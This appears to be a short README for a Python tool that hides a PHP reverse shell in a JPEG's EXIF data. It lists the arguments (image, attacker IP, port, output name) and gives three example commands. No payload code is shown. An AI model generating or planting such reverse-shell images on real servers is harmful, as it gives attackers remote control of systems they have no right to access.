# PHP-Reverse-Shell-Image-Generato

### Generate PHP Reverse Shell Image (JPEG)  
  
#### Required Arguments  
**\-i,  \-\-image**           Image File to Convert (Required)  
**\-a,  \-\-ipaddr**          Attacker IP (Required)  

#### Optional Argument  
**\-p,  \-\-port**            Attacker Port [default:21]  
**\-o,  \-\-outfilename**    Use a Different Name to Original Image  
**\-h,  \-\-help**            Show Help  


#### Syntax  
python3 PHPReverseShell2ImageExif.py \-\-image="image.jpeg" \-\-ipaddr"127.0.0.1" \-\-port"21" \-\-outfilename"newimage.jpg"  
python3 PHPReverseShell2ImageExif.py \-\-image="image.jpeg" \-\-ipaddr"127.0.0.1" \-\-port"21"  
python3 PHPReverseShell2ImageExif.py \-\-image="image.jpeg" \-\-ipaddr"127.0.0.1"  
